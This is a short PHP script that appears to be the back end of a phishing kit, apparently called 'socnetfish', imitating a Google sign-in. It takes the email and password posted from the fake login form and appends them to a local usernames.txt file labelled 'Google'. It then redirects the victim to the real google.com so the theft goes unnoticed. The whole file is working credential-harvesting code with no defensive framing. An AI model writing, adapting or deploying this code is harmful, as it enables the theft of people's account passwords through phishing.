<?php
$usuario = exec('whoami');
file_put_contents("/home/". $usuario ."/.config/socnetfish/usernames.txt","\n" . "Google" . "\n" . "Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
